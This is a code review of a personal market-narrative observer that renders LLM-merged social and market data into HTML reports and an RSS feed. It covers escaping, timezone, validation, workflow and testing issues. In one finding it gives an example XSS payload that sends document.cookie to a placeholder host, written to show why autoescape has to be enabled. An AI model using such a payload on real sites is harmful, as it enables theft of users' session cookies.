# Code Review · narrative-observer

Reviewer: Senior Code Reviewer · 2026-04-26
Scope: full codebase against the brief. Read everything in `src/observer/`, `templates/`, `.github/workflows/run.yml`, `pyproject.toml`, `README.md`, plus produced `site/feed.xml`. Verified findings dynamically where useful.

What's good first: the architecture is appropriate to the size. Source modules are flat, single-purpose, and easy to delete. The CLI is one screen. The HTML template is the most expressive thing in the repo and it earned that. Defensive `_normalize_theme` shows you've already eaten an LLM-shape bug. The two-window xAI design (`24h` + `7d`) cleanly drives the `tempo` taxonomy in the renderer — that's a nice signal. Now the issues.

---

## CRITICAL

### C1. Jinja autoescape is silently OFF for every template
`src/observer/render/html.py:105` and `:167` call `select_autoescape(["html"])`. Templates are named `report.html.j2`, `index.html.j2`, `_base.html.j2`. `select_autoescape` matches by **filename suffix**: `.html.j2` is not in the list, so autoescape resolves to `False` for every render. Verified:

```
>>> select_autoescape(['html'])('foo.html.j2')  # → False
>>> select_autoescape(['html'])('foo.html')     # → True
```

Every value rendered into the report (`t.name`, `t.narrative`, `t.evidence`, `tk.code`, `tk.name_native`, `m.raw_text`, `h.ticks`, …) originates from xAI/Reddit/PTT/Naver content, ultimately user-controlled text. A theme name `"<script>fetch('//x/?'+document.cookie)</script>"` would execute. Even without active exploitation, a stray `<` from PTT will break the layout.

**Fix:** `autoescape=select_autoescape(enabled_extensions=("html", "html.j2", "j2"), default=True)` — or simpler, `autoescape=True`. Re-render existing reports with `observer reindex` (extend it to also re-render — see L1).

### C2. RSS `pubDate` is wrong on any non-UTC host
`render/feed.py:14`:
```python
return datetime.strptime(f"{d}_{t}", "%Y-%m-%d_%H%M").replace(tzinfo=timezone.utc)
```
Filenames are produced from `datetime.now()` (local wall-clock) in `render/html.py:109` then re-tagged as UTC here. On a Beijing host that's an 8-hour lie; in Actions it happens to be correct only because the runner is UTC. Two correct options: write filenames in UTC (`datetime.now(timezone.utc)`) **and** parse as UTC, or stamp the report with explicit ISO+offset and parse that. Either way pick one source of truth.

---

## HIGH

### H1. `pyproject.toml` lists deps that nothing imports
- `feedgen>=1.0` — not imported anywhere; `feed.py` hand-rolls XML.
- `lxml>=5.0` — only used implicitly as a BeautifulSoup parser backend; that's fine, leave it but document.
- The brief mentions DuckDB; **not present** in `pyproject.toml`. Either the brief is stale or you removed it cleanly. `src/observer/store/__init__.py` is 0 bytes; **delete the package** rather than leaving a hollow placeholder advertising work that doesn't exist.

**Fix:** drop `feedgen`. Delete `src/observer/store/`. Add a one-line `# parser backend for bs4` next to `lxml`.

### H2. `synth/merge.py` has no schema validation, only an existence check
`merge.py:140` parses JSON and returns `parsed.get("themes", [])` raw. The downstream `_normalize_theme` patches *some* shape bugs (string→list coercion, missing booleans), but:

- No check that `heat` is one of `{high, mid, low}` — anything else falls through to `HEAT_RANK.get(..., 1)` and silently scores as 1 in the heat strip.
- No check that `tempo` is one of the 4 enums — template renders `{{ t.tempo }}` literally if Grok invents `"rising"`.
- `_extract_json` finds first `{` to last `}` — a model that emits `"narrative": "the {curly} braces"` followed by trailing prose can break the slice. A model that wraps the JSON in `{"data": {"themes": [...]}}` returns `themes=[]` silently.

**Fix:** add a small dataclass / TypedDict check (or a 30-line manual validator) right after `_extract_json`. Drop themes that fail validation rather than rendering garbage. Promote `parse_error` cases to a visible "merge degraded" banner — currently they only show if `themes` is empty AND `raw_text` is set, which is an `or` away from disappearing entirely.

### H3. KRX proxy contextmanager is not thread-safe
`sources/krx.py:11-20` mutates `os.environ` for the duration of the call. If you ever parallelize the three markets (very tempting given the cron is 15min total budget, half spent in xAI), concurrent KRX + PTT calls will race: PTT inside `_no_proxy` window will lose its proxy and fail. Today everything is sequential so it's latent, but it's a footgun worth fixing now.

**Fix:** `pykrx` ultimately uses `requests`. Pass `proxies={"http": None, "https": None}` to its session, or vendor a 10-line wrapper around the one endpoint you actually use. Avoid env-var mutation entirely.

### H4. Per-market collect failures are too coarse to act on
`cli.py:148-152` catches every collector exception into a flat dict with `counts={"error": str(e)}`. Then `cli.py:168` does `if not data["sources"]: continue`. So a market that fails its **xAI** call (the most expensive thing) silently drops out of the report with no banner, no log line beyond the original exception. The report renders without that market and the index gains a normal-looking issue.

**Fix:** in `render_report`, surface markets that were attempted-but-failed as a dim section ("数据源全部失败"). Otherwise users can't tell "no signal" from "we broke."

---

## MEDIUM

### M1. `cli.py` collector duplication
`collect_us / collect_tw / collect_kr` repeat the same shape (xai windows → secondary sources → counts dict). The wins from DRYing this are small but real: a single `collect(market, secondary_fns)` reduces three ~15-line functions to one ~10-line function plus a registry. Worth doing when adding a 4th market (Japan? HK?).

### M2. `_extract_json` regex is fragile but the symptom is silent
Already covered in H2 — calling out separately because the regex `r"^```(?:json)?\s*\n?(.+?)\n?```\s*$"` fails on output that includes prose **after** the closing fence. That's a common Grok output pattern. Trim to first fence pair specifically:
```python
m = re.search(r"```(?:json)?\s*\n(.+?)\n```", text, re.DOTALL)
```

### M3. `render_report` doesn't dedupe filenames
`render/html.py:110` uses `now.strftime("%Y-%m-%d_%H%M")`. Two runs in the same minute (manual `workflow_dispatch` after a cron run) overwrite each other and break the issue numbering, since `_existing_issue_count` counts files. Cheap fix: include seconds or test for collision and append `_2`.

### M4. Cost is logged then thrown away
`cli.py:197` prints `total cost ${total_cost:.4f}` and exits. `data/<date>/raw_*.json` does **not** include cost — only the prompts/sources blob. To answer "did this month cost what I expected," the only signal is GitHub Actions log scraping. Persist cost into the snapshot json (`raw["_cost"] = ...`) and into a top-level `data/cost.csv` (one row per run). Two lines in `cli.py`.

### M5. Workflow pulls gh-pages then deploys via Pages API → confusing not broken
`run.yml:44-51` checks out `origin/gh-pages` into `site/` to preserve historical reports, then `actions/deploy-pages@v4` uploads `site/` as the new artifact. This works because the project effectively treats `gh-pages` as durable storage for past `20*.html` files, but:

- The branch is named `gh-pages` while Pages source is "GitHub Actions" (per README) — there's no actual gh-pages serving, only artifact deploys. The branch is being used as a backup store.
- If a deploy succeeds but the `git push` to `gh-pages` doesn't happen anywhere (it doesn't — I see no push step), then your "history" lives only in artifacts, which expire. **Today, your past issues survive only because the deploy artifact survives.** A reader of `gh-pages` two months from now will find it stale.

**Fix one of two ways:** (a) actually push the new `site/` to `gh-pages` after a successful run so the branch is the source of truth, or (b) drop the gh-pages pull entirely and accept that the cron must rebuild from `data/` snapshots if past reports are wanted. Right now you're in a half-state.

### M6. `render_feed`'s default `SITE_URL` is a placeholder that can ship
`feed.py:8`: `SITE_URL = "https://example.github.io/observer"`. The CI sets `SITE_URL` from a Variable — if that Variable is unset, the placeholder ships and every RSS reader gets a 404. Confirmed in current `site/feed.xml`: that's the URL right now. Fail loudly if `SITE_URL` is missing in CI:
```python
if not site_url or "example" in site_url:
    raise SystemExit("SITE_URL var not configured")
```

### M7. Reddit fetcher never falls back when a sub dies
`sources/reddit.py:56-57` swallows the per-listing exception and continues with whatever `merged` dict it has. That's correct for partial degradation, **but** there's no signal that it happened — `out[sub]` is `[]` and the only trace is a printed `! r/foo hot:`. The downstream `counts["Reddit"]["n"]` aggregates across all 4 subs, hiding which one died. Track per-sub failures in counts.

### M8. No `Accept` header for Reddit; relying on default UA gets rate-limited
The UA is set; Reddit *does* sometimes 429 the cute UA. Add a basic `Accept: application/json` and consider increasing `time.sleep(2)` to 3s when iterating 4 subs × 2 listings = 8 calls. Easy win.

---

## LOW

### L1. `reindex` re-renders index + feed but not reports
After fixing C1 you'll want to re-render historical reports. `reindex` only rebuilds index/feed. Either add a `reindex --reports` mode that re-renders from snapshots in `data/`, or re-merge from saved raw text — but the merge result was never saved (see L3).

### L2. Snapshot file is timestamped but report file is also timestamped — no link
`data/2026-04-26/raw_1648.json` and `site/2026-04-26_1648.html` are conceptually paired but the only link is the eyeball-matched timestamp. Embed the raw snapshot path in the report (HTML comment) or write a sidecar `<report>.meta.json` keyed to the snapshot.

### L3. Merged result is never persisted
The brief flagged this — confirmed. `merged` lives only in memory. If the renderer crashes (template typo, jinja undefined), the LLM money is spent and you must re-run. Save `merged_<HHMM>.json` next to the raw snapshot. Five lines.

### L4. `_summarize_*` lives in `cli.py`
These are pure formatting helpers tied to source shape. Moving each one next to its source module (`reddit._summarize`, `ptt._summarize`, …) lets each source own "what it looks like to the LLM" — also makes the source-fail path more uniform.

### L5. Hard-coded SUBS / market labels / KRX top_n in code
Not a real problem at this size, but if you want to add a market you currently edit `cli.py`, `xai.py`, `render/html.py`, and `templates/report.html.j2`. A `markets.toml` (4 fields per market: code, label_cn, label_en, prompt path) would centralize that.

### L6. README cost estimate ($15-25/mo) doesn't match a 1×/day cron
The workflow runs at 22:30 UTC daily — that's 1×/day, not 4×/day. README says "4 次/天 × 30 天 ≈ $15-25/月". Either the schedule is meant to be more aggressive (then update cron) or the cost estimate is stale (then update README).

### L7. `XAI_API_KEY` not asserted at startup
`config.py:11` reads it as `Optional[str]`. First failure happens deep in `httpx` with a 401. A 3-line check at CLI entry is cheap and gives the right error message.

### L8. `printed` everywhere instead of `logging`
Fine for personal tooling, but the moment you want to grep CI logs for "merge cost" across runs you'll wish you had structured logging. Not urgent; flag for the next revision.

---

## NICE-TO-HAVE

- **N1.** Theme color metadata (`<meta name="theme-color">`) is correct for prefers-color-scheme but doesn't follow user's manual toggle. Add a one-line JS update in the toggle handler.
- **N2.** The `pulse` keyframe is defined twice (`report.html.j2:27` and `index.html.j2:62`). Move to `_base.html.j2`.
- **N3.** `_to_list` returns `[v]` for an arbitrary `v`. If Grok ever returns `evidence: 42`, you'll render `42` in a `<li>`. Fine, but logs would be nice.
- **N4.** Add a `make probe` shortcut. The README's three-line probe invocation is the most-used command and deserves a one-token alias.

---

## Tests — minimal worthwhile surface

You have zero. The **two** test surfaces with the highest catch-bugs/effort ratio:

1. **`merge._extract_json` + `render._normalize_theme` golden tests.** Six fixtures in a `tests/fixtures/grok_output/` dir: clean JSON, wrapped in `json` fence, wrapped in bare fence, JSON with prose suffix, theme with string-evidence, theme with missing booleans. Assert the post-normalize shape. Catches the LLM-output drift class of bugs forever. ~80 lines total.
2. **A snapshot test for the renderer.** Feed a fixed `merged_results` dict through `render_report` (point `SITE_DIR` at a tmp), assert `out.exists()` and that key strings appear. Catches template breakage during CSS work. ~30 lines.

Skip integration tests against xAI/Reddit/PTT — those break for environment reasons, not code reasons.

---

## What I'd refactor first — top 5

1. **C1** — turn autoescape on. One-line edit; massive XSS reduction. Re-render existing reports.
2. **H2** — schema-validate `merge_market` output. The `_normalize_theme` band-aid is hiding decisions Grok is making for you (e.g., inventing `tempo` values). Make the contract explicit and crash on violation.
3. **M5** — decide on the gh-pages-vs-Pages-artifact story. Either push to `gh-pages` after deploy or stop pulling from it. The current half-state will lose history the day artifacts expire.
4. **L3 + M4** — persist merged JSON and per-run cost. Both are 5-line changes that make every future debugging session 10× easier.
5. **H3** — replace the `_no_proxy` env-mutation with a proper requests-session proxy override in `krx.py`. Eliminates the parallelization footgun before you trip on it.

---

## Files referenced

- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/render/html.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/render/feed.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/synth/merge.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/sources/xai.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/sources/reddit.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/sources/ptt.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/sources/krx.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/sources/naver.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/cli.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/src/observer/config.py`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/templates/_base.html.j2`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/templates/report.html.j2`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/templates/index.html.j2`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/.github/workflows/run.yml`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/pyproject.toml`
- `/Users/lxxxxxx/个人项目/自用主题叙事观测/README.md`
